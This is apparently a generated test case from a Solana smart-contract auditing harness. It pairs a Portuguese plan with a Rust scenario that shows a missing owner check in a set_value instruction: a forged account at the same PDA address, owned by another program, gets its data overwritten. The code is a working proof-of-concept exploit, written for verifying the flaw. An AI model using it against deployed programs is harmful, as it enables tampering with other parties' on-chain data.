{"plan": "O programa set_value valida o PDA por seeds mas nao verifica o owner da conta data_account. Vou montar um baseline legitimo com a conta PDA correta (dono = program_id) e um atacante que passa a mesma conta PDA mas com dono diferente (forjado por outro programa). O ataque deve ser aceito e sobrescrever os dados da conta, demonstrando que a ausencia de checagem de owner permite modificar conta de outro dono. O efeito medido e que a conta forjada teve seus bytes 8..40 alterados para a chave do usuario.", "scenario": "let user = Pubkey::new_unique();
let seeds: &[&[u8]] = &[b"data", user.as_ref()];
let (pda, _bump) = Pubkey::find_program_address(seeds, &env.program_id);

let mut legit_data = vec![0u8; 49];
let legit_account = account(&env.program_id, &legit_data, None);

let value: u64 = 42;
let mut ix_data = vec![1u8];
ix_data.extend_from_slice(&value.to_le_bytes());

let metas = vec![
    AccountMeta::new(pda, false),
    AccountMeta::new_readonly(user, false),
];
let ix = env.raw_ix(&ix_data, metas);

let contas = vec![
    (pda, legit_account.clone()),
    (user, wallet(1_000_000)),
];

let base = env.baseline("set_value legitimo com PDA do programa", &ix, &contas);

let mut forged_data = vec![0u8; 49];
let forged_account = account(&env.attacker_program.unwrap_or(Pubkey::new_unique()), &forged_data, None);

let contas_ataque = vec![
    (pda, forged_account),
    (user, wallet(1_000_000)),
];

let r = env.attack("set_value com conta PDA de outro dono", &ix, &contas_ataque);
if r.program_result == ProgramResult::Success {
    let d = after(&r, &pda).data();
    env.effect("conta de outro dono teve dados sobrescritos", read_pubkey(d, 8) == user && read_u64(d, 40) == value);
}"}

